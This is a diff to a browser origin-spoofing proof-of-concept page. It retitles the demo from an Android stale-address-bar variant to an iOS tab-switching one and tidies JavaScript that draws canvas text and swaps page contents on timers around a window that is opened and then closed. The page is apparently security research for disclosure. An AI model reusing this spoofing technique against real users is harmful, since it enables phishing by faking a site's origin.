@@ -16,7 +16,7 @@ body {
 </head>
 <body>
 <div id="startContent">
-<h1>PoC: Android origin spoof due to stale address bar</h1>
+<h1>PoC: iOS origin spoof (Tab switching)</h1>
 <p id="instructions">Tap to continue</p>
 </div>
 <div id="spoofContent" class="hide">
@@ -74,7 +74,7 @@ var drawCanvas = (text) => {
             ctx.fillText(text, 50, (targetHeight/2)+(fontSize/2));
         }
     }
-  }
+}
 
 var createVideo = (canvasElem) => {
     const video = document.createElement('video');
@@ -121,8 +121,6 @@ window.addEventListener('click', () => {
     }, 2000);
     setTimeout(() => {
         drawCanvas('Scroll down\nslowly');
-        //drawCanvas('Scroll down\nto continue');
-        //drawCanvas('Scroll down');
         replaceContents();
         setTimeout(() => {
             newWin.close();
